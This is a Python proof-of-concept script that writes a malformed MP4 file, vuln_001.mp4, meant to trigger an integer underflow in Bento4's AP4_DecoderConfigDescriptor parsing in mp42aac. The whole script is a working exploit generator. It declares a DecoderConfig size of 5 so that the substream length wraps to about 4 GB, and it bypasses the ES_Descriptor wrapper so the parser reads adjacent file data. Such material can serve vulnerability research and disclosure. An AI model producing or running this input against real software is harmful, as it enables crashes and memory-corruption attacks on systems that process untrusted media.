#!/usr/bin/env python3
"""
VULN-001 PoC generator: Integer Underflow in AP4_DecoderConfigDescriptor
(stream constructor), Bento4 mp42aac.

Trigger: DecoderConfigDescriptor (tag=0x04) payload_size < 13.
At line 92 of Ap4DecoderConfigDescriptor.cpp:
  new AP4_SubStream(stream, start+13, payload_size-13)
When payload_size == 5, payload_size-13 wraps to 0xFFFFFFF3 (~4 GB).

Design note:
  The DecoderConfig descriptor is placed directly inside the esds box body
  (bypassing the ES_Descriptor level), so it is parsed against the raw file
  stream rather than a bounded ES_Descriptor SubStream. This ensures the
  underflowed SubStream size (0xFFFFFFF3) is applied against the file stream
  rather than being immediately clamped by a 10-byte ES_Descriptor window.
"""

import struct
import sys
import os


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def box(fourcc: str, payload: bytes) -> bytes:
    """Wrap payload in an ISOBMFF box (4-byte size BE + 4-byte type + data)."""
    assert len(fourcc) == 4
    total = 8 + len(payload)
    return struct.pack(">I", total) + fourcc.encode() + payload


def desc_size_encode(size: int) -> bytes:
    """MPEG-4 expandable-class size encoding (up to 4 bytes)."""
    if size < 128:
        return struct.pack("B", size)
    elif size < 16384:
        return struct.pack("BB", 0x80 | (size >> 7), size & 0x7F)
    elif size < 2097152:
        return struct.pack("BBB",
                           0x80 | (size >> 14),
                           0x80 | ((size >> 7) & 0x7F),
                           size & 0x7F)
    else:
        return struct.pack("BBBB",
                           0x80 | (size >> 21),
                           0x80 | ((size >> 14) & 0x7F),
                           0x80 | ((size >> 7) & 0x7F),
                           size & 0x7F)


def descriptor(tag: int, payload: bytes) -> bytes:
    """Build an MPEG-4 descriptor: tag(1) + encoded_size + payload."""
    return struct.pack("B", tag) + desc_size_encode(len(payload)) + payload


def descriptor_with_fake_size(tag: int, fake_size: int, real_payload: bytes) -> bytes:
    """
    Build a descriptor where the encoded size field is deliberately wrong.
    fake_size < 13 triggers the underflow in AP4_DecoderConfigDescriptor line 92.
    """
    return struct.pack("B", tag) + desc_size_encode(fake_size) + real_payload


# ---------------------------------------------------------------------------
# Build the malicious esds box
# ---------------------------------------------------------------------------

def build_esds() -> bytes:
    """
    Build an esds box that places a malicious DecoderConfigDescriptor
    DIRECTLY at the top level (tag=0x04 right after the esds version/flags),
    bypassing the ES_Descriptor wrapper.

    This ensures the DecoderConfigDescriptor constructor receives the raw
    file ByteStream (not a 10-byte bounded ES_Descriptor SubStream), so the
    underflowed SubStream size 0xFFFFFFF3 is applied directly against the
    file stream, allowing the while loop to read adjacent MP4 box data as
    if it were DecoderConfig sub-descriptors.

    Underflow: payload_size(5) - 13 = 0xFFFFFFF3 (~4 GB) in unsigned 32-bit.
    """

    # Malicious DecoderConfigDescriptor (tag=0x04, declared size=5 < 13)
    # Real 5-byte payload: objectTypeIndication + streamType/bits + 3 bytes of bufferSizeDB
    # The constructor then tries to read 8 more bytes (maxBitrate + avgBitrate) from
    # the stream, which come from adjacent file content (SLConfig / stts box bytes).
    decoder_config_payload = struct.pack("BBBBB",
        0x40,   # objectTypeIndication: Audio ISO/IEC 14496-3
        0x15,   # streamType (audio=0x05 << 2) | upstream=0 | reserved=1
        0x00,   # bufferSizeDB high
        0x00,   # bufferSizeDB mid
        0x00,   # bufferSizeDB low
    )
    # tag=0x04, fake_size=5 (< 13) => triggers underflow in line 92
    decoder_config_desc = descriptor_with_fake_size(0x04, 5, decoder_config_payload)

    # SLConfigDescriptor (tag=0x06, size=1) - follows the DecoderConfig;
    # its bytes get consumed as part of maxBitrate/avgBitrate reads and then
    # appear in the 4 GB sub-stream window.
    sl_config_payload = struct.pack("B", 0x02)  # predefined
    sl_config_desc = descriptor(0x06, sl_config_payload)

    # esds box: version/flags=0, then descriptors directly (no ES_Descriptor wrapping)
    esds_body = struct.pack(">I", 0x00000000) + decoder_config_desc + sl_config_desc
    return box("esds", esds_body)


# ---------------------------------------------------------------------------
# Build the mp4a sample entry box
# ---------------------------------------------------------------------------

def build_mp4a() -> bytes:
    esds = build_esds()
    payload = (
        b'\x00' * 6 +                    # reserved
        struct.pack(">H", 1) +            # data-reference-index
        b'\x00' * 8 +                    # reserved
        struct.pack(">H", 2) +            # channelcount
        struct.pack(">H", 16) +           # samplesize
        struct.pack(">H", 0) +            # pre_defined
        struct.pack(">H", 0) +            # reserved
        struct.pack(">HH", 44100, 0) +    # samplerate (16.16 fixed)
        esds
    )
    return box("mp4a", payload)


# ---------------------------------------------------------------------------
# Build stbl (sample table)
# ---------------------------------------------------------------------------

def build_stbl() -> bytes:
    mp4a = build_mp4a()

    # stsd: version/flags + entry_count=1 + mp4a
    stsd_payload = struct.pack(">II", 0, 1) + mp4a
    stsd = box("stsd", stsd_payload)

    stts = box("stts", struct.pack(">II", 0, 0))
    stsc = box("stsc", struct.pack(">II", 0, 0))
    stsz = box("stsz", struct.pack(">III", 0, 0, 0))
    stco = box("stco", struct.pack(">II", 0, 0))

    return box("stbl", stsd + stts + stsc + stsz + stco)


# ---------------------------------------------------------------------------
# Build dinf (data information)
# ---------------------------------------------------------------------------

def build_dinf() -> bytes:
    url_payload = struct.pack(">I", 0x000001)   # version=0, flags=self-contained
    url_entry = box("url ", url_payload)
    dref_payload = struct.pack(">II", 0, 1) + url_entry
    dref = box("dref", dref_payload)
    return box("dinf", dref)


# ---------------------------------------------------------------------------
# Build minf (media information)
# ---------------------------------------------------------------------------

def build_minf() -> bytes:
    smhd = box("smhd", struct.pack(">IHH", 0, 0, 0))
    dinf = build_dinf()
    stbl = build_stbl()
    return box("minf", smhd + dinf + stbl)


# ---------------------------------------------------------------------------
# Build mdia (media box)
# ---------------------------------------------------------------------------

def build_mdia() -> bytes:
    mdhd_payload = (
        struct.pack(">IIIII", 0, 0, 0, 44100, 0) +
        struct.pack(">HH", 0x55C4, 0)
    )
    mdhd = box("mdhd", mdhd_payload)

    hdlr_payload = (
        struct.pack(">II", 0, 0) +
        b'soun' +
        struct.pack(">III", 0, 0, 0) +
        b'\x00'
    )
    hdlr = box("hdlr", hdlr_payload)

    minf = build_minf()
    return box("mdia", mdhd + hdlr + minf)


# ---------------------------------------------------------------------------
# Build trak (track box)
# ---------------------------------------------------------------------------

def build_trak() -> bytes:
    tkhd_payload = (
        struct.pack(">I", 0x00000003) +
        struct.pack(">IIIII", 0, 0, 1, 0, 0) +
        struct.pack(">II", 0, 0) +
        struct.pack(">HHHH", 0, 0, 0x0100, 0) +
        struct.pack(">iiiiiiiii",
                    0x00010000, 0, 0,
                    0, 0x00010000, 0,
                    0, 0, 0x40000000) +
        struct.pack(">II", 0, 0)
    )
    tkhd = box("tkhd", tkhd_payload)
    mdia = build_mdia()
    return box("trak", tkhd + mdia)


# ---------------------------------------------------------------------------
# Build moov (movie box)
# ---------------------------------------------------------------------------

def build_moov() -> bytes:
    mvhd_payload = (
        struct.pack(">I", 0) +
        struct.pack(">IIIII", 0, 0, 1000, 0, 0x00010000) +
        struct.pack(">H", 0x0100) +
        struct.pack(">H", 0) +
        struct.pack(">II", 0, 0) +
        struct.pack(">iiiiiiiii",
                    0x00010000, 0, 0,
                    0, 0x00010000, 0,
                    0, 0, 0x40000000) +
        struct.pack(">IIIIII", 0, 0, 0, 0, 0, 0) +
        struct.pack(">I", 2)
    )
    mvhd = box("mvhd", mvhd_payload)
    trak = build_trak()
    return box("moov", mvhd + trak)


# ---------------------------------------------------------------------------
# Build the complete MP4 file
# ---------------------------------------------------------------------------

def build_mp4() -> bytes:
    ftyp_payload = b'isom' + struct.pack(">I", 0) + b'isom'
    ftyp = box("ftyp", ftyp_payload)
    moov = build_moov()
    mdat = box("mdat", b'')
    return ftyp + moov + mdat


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001.mp4")
    if len(sys.argv) > 1:
        out_path = sys.argv[1]

    data = build_mp4()
    with open(out_path, "wb") as f:
        f.write(data)
    print(f"[+] Written {len(data)} bytes to {out_path}")
    print("[+] DecoderConfigDescriptor directly in esds (no ES_Descriptor wrapper)")
    print("[+] Declared payload_size=5 (< 13) => underflow: 5-13 = 0xFFFFFFF3 (~4 GB)")
    print("[+] Line 92: new AP4_SubStream(file_stream, start+13, 0xFFFFFFF3)")
    print("[+] While loop reads adjacent MP4 box data as DecoderConfig sub-descriptors")
